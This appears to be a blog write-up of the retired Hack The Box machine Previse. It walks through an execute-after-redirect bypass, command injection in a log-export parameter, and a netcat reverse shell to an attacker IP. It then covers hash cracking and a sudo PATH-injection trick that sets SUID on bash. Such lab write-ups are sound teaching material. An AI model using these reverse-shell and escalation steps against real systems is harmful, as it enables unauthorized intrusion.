---
layout: post
title: "Hack The Box Write-Up: Previse"
date: 2025-10-22
os: Linux
difficulty: Easy
release: Aug 07, 2021
tags: [Path Injection, Linux, Command Injection, Hashcat, HTB, Writeup, Retired]
description: "Web exploitation challenge involving Execute After Redirect (EAR) analysis and command injection to gain initial access, culminating in root privileges via sudo PATH injection."
--- 

<style>
.machine-info {
    text-align: center;
    margin: 2rem auto;
    max-width: 600px;
}

.machine-info img {
    margin: 1rem auto 2rem;
    display: block;
    max-width: 300px;
}

.machine-info ul {
    list-style: none;
    padding: 0;
    margin: 0 auto;
    display: inline-block;
    text-align: left;
}

.machine-info ul li {
    margin-bottom: 0.5rem;
}
</style>

<div class="machine-info">
  <img src="/assets/posts/htb-previse/Previse-logo.png" alt="Previse Logo">
  
  <ul>
    <li><strong>Category:</strong> Hack The Box</li>
    <li><strong>Operating System:</strong> Linux</li>
    <li><strong>Release Date:</strong> August 07, 2021</li>
    <li><strong>Difficulty:</strong> Easy</li>
    <li><strong>Link:</strong> <a href="https://www.hackthebox.com/machines/Previse">Previse</a></li>
    <li><strong>Created By:</strong> <a href="https://app.hackthebox.com/profile/107145">m4lwhere</a></li>
  </ul>
</div>

## Recon
### Scanning

We will start by mapping the ``previse.htb`` hostname to the IP address of the box. Your ``/etc/hosts`` should contain this entry. Make sure you replace the IP provided with the one given to you:

```bash
~ cat /etc/hosts
10.129.95.185 previse.htb
```

``nmap`` found two open TCP ports, SSH (22) and HTTP (80):

```bash
~ nmap -sVC 10.129.95.185

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration

When we access ``previse.htb``, we are redirected to a login page:

![Previse Login Screen](/assets/posts/htb-previse/previse-login-screen.png)

*Figure 1: Previse Login Screen*

After trying out some default usernames and passwords, nothing worked. I then ran ``ffuf`` to find subdirectories.

```bash
~ ffuf -u http://previse.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -e .php -fc 403,404,303,405

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previse.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,404,303,405
________________________________________________

accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94, Duration: 63ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 54ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 57ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10, Duration: 59ms]
files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113, Duration: 59ms]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6, Duration: 61ms]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21, Duration: 64ms]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72, Duration: 59ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 60ms]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54, Duration: 63ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32, Duration: 61ms]
status.php              [Status: 302, Size: 2966, Words: 749, Lines: 75, Duration: 59ms]
:: Progress: [40956/40956] :: Job [1/1] :: 680 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
```
From there, I started looking at all the pages and almost everything redirected to ``/login.php`` but ``nav.php`` had some interesting links: 

![Previse nav.php](/assets/posts/htb-previse/nav-php.png)

*Figure 2: /nav.php*

The links are: 
- Home: ``/index.php``
- Accounts + Create Account: ``/accounts.php``
- Files: ``/files.php``
- Management Menu + Website Status: ``/status.php``
- Log data: ``/file_logs.php``

When clicking on the links, they all redirect to ``/login.php`` because we are not authenticated. 

### Execute After Redirect (EAR) Vulnerability

After inspecting reqeuests in burpsuite, we notice that the ``/`` returns a HTTP 302 redirect to ``/login.php``. However, there’s also a full page in that response:

```http
HTTP/1.1 302 Found
Date: Thu, 23 Oct 2025 05:34:27 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 2801
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
                
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Previse rocks your socks." />
        <meta name="author" content="m4lwhere" />
        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="manifest" href="/site.webmanifest">
        <link rel="stylesheet" href="css/uikit.min.css" />
        <script src="js/uikit.min.js"></script>
        <script src="js/uikit-icons.min.js"></script>
...<SNIP>...
```

This is a classic example of an execution after redirect (EAR) vulnerability. 

### Skiping Redirects

By default, Burp intercept only stops requests, not responses. To see the root page, you'll have to turn on Server Response Interception in Burp Proxy, and then turn Intercept on (Indicated by the red rectangle): 

![Previse Burp-Reponse-Interception](/assets/posts/htb-previse/burp-response-interception.png)

*Figure 3: Turning on Burpsuite's Response Interception*

After that, I will go to ``http://previse.htb`` in the burp browser, forwarding the request without changes, and Burpsuite catches the response:

![Previse Burp-Reponse](/assets/posts/htb-previse/burp-response.png)

*Figure 4: Burpsuite Intercepting the Response*

After changing the response code from ``302`` to ``200``, we can see that the page comes back: 

![Previse Code-change-Response](/assets/posts/htb-previse/page-change-response.png)

*Figure 5: Response on the Page*

From there, we can go to ``accounts.php`` using the same process that we did before. That page has a message saying that only admins should be here, which probably means that we can use it to exploit the application: 

![Previse accounts-php](/assets/posts/htb-previse/accounts-php.png)

*Figure 6: /accounts.php*

After that, we fill out the form and create a new account. After that, we can turn off Burpsuite and log into the web app normally. 

![Previse account-creation](/assets/posts/htb-previse/account-creation.png)

*Figure 7: Account Creation*

### Log Data

After Logging in, I visited the ``/file_logs.php`` and was able to request the log data: 

![Previse log-data](/assets/posts/htb-previse/log-data.png)

*Figure 8: Log Data*

## Inital Access

Looking at Burpsuite and performing more enumeration, we can notice that the ``POST`` request to ``/logs.php`` sends a ``delim=comma`` parameter. 

![Previse burp-delim-comma](/assets/posts/htb-previse/burp-delim.png)

*Figure 9: Response with the delim parameter set to comma*

After trying to change the parameter to something that is not one of the options in the dropdown (``delim=taco``), we can see that we get the same response as a comma. 

![Previse burp-delim-space](/assets/posts/htb-previse/burp-delim-space.png)

*Figure 10: Response with the delim parameter set to space*

![Previse burp-delim-taco](/assets/posts/htb-previse/burp-delim-taco.png)

*Figure 11: Response with the delim parameter set to taco*

We can try and abuse the ``delim=taco`` parameter to see if we can gain command injection. This can be done by adding a ``;curl%20http://10.10.14.6:8888`` at the end of the request and hosting a python server (``python -m http.server 8888``) to see if the command is executed: 

![Previse burp-cmd-injection](/assets/posts/htb-previse/burp-cmd-injection.png)
*Figure 12: Command Execution*

From there, we can get a reverse shell by adding this command in the command injection and starting a listener on our local machine:

Revshell cmd: ``nc%2010.10.14.6%204444%20-e%20/bin/sh``

![Previse burp-revshell](/assets/posts/htb-previse/burp-revshell.png)

*Figure 13: Reverse Shell as www-data*

After that, you can use a python command to spawn a ``/bin/bash`` shell. 

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation to m4lwhere
After getting access to the system as ``www-data``, we perform system enumeration and find the password to the database in ``/var/www/html/config.php``:

![Previse burp-revshell](/assets/posts/htb-previse/db-password.png)

*Figure 14: Database Password*

From there, we can use these creds to connect to the database using the follwing command: 

Command to connect to the database: ``mysql -u root -p``

![Previse database](/assets/posts/htb-previse/db-connection.png)
*Figure 15: Connecting to the Database*

From there, you can connect to the database and show tables to dump the accounts. 

![Previse dumping-database](/assets/posts/htb-previse/db-dump.png)

*Figure 16: Dumping the Database Tables*

After dumping the tables, we can see the hashe for the user that we created and m4lwhere. We copy out the hashes to a different file to try and crack them using hashcat. 

Hashcat Command: ``hashcat -m500 user.hash /usr/share/wordlists/rockyou.txt``

![Previse cracking-hashes](/assets/posts/htb-previse/crack-hash.png)

*Figure 17: Cracking the hashes with hashcat*

From there, we can SSH as ``m4lwhere`` onto the machine and get the user flag.

![Previse user-flag](/assets/posts/htb-previse/user-flag.png)

*Figure 18: User Flag*

## Privilege Escalation to root
After gaining access to the user ``m4lwhere``, we run ``sudo -l`` to see what commands the user run as sudo. We can see that the user can run ``/opt/scripts/access_backup.sh`` as root. 

```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ 
```

Looking at the script, we can see that it uses the ``/bin/gzip`` binary to backup the directories: 

```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
m4lwhere@previse:~$ 
```

We can see that gzip is called without a complete path. This means that we can use Path Injection and set the SUID bit on ``/bin/bash`` to spawn a root shell. Here are the commands for it:

```bash
m4lwhere@previse:~$ mkdir /tmp/evil
m4lwhere@previse:~$ vim /tmp/evil/gzip
m4lwhere@previse:~$ cat /tmp/evil/gzip 
#!/bin/bash
chmod u+s /bin/bash
m4lwhere@previse:~$ export PATH=/tmp/evil:$PATH
```

From there, we can run the ``access_backup.sh`` script and that will set the SUID bit on the ``/bin/bash`` binary, which we can use to spawn a root shell. 

```bash
m4lwhere@previse:~$ sudo PATH=/tmp/evil:$PATH /opt/scripts/access_backup.sh
m4lwhere@previse:~$ ls -al /bin/bash 
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
m4lwhere@previse:~$ /bin/bash -p
bash-4.4#
```

![Previse root-flag](/assets/posts/htb-previse/root-flag.png)

*Figure 19: Root Flag*